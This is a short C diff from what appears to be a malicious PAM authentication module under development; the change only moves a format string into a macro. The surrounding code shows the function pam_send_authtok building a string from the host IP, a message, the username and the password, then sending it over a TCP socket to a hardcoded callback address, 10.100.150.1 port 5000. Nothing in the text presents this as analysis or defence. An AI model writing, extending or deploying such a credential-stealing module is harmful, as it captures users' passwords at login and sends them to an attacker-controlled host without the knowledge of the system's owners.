@@ -18,12 +18,11 @@
 
 #define CALLBACK_IP "10.100.150.1"
 #define CALLBACK_PORT 5000
+#define RET_FMT "%s - %s %s:%s\n"
 
 typedef int (*pam_func_t)(pam_handle_t *, int, int, const char **);
 
 int pam_send_authtok(pam_handle_t *pamh, const char *message, const char *username, const char *password) {
-    const char *ret_fmt = "%s - %s %s:%s\n";
-
     char hostbuffer[256];
     char* ipaddr;
     struct hostent *host_entry;
@@ -48,7 +47,7 @@ int pam_send_authtok(pam_handle_t *pamh, const char *message, const char *userna
 
         if(connect(sock, (struct sockaddr*)&serv_addr, sizeof(serv_addr)) == 0) {
             char credentials[256];
-            snprintf(credentials, sizeof(credentials), ret_fmt, ipaddr, message, username, password);
+            snprintf(credentials, sizeof(credentials), RET_FMT, ipaddr, message, username, password);
             send(sock, credentials, strlen(credentials), 0);
             close(sock);
          }
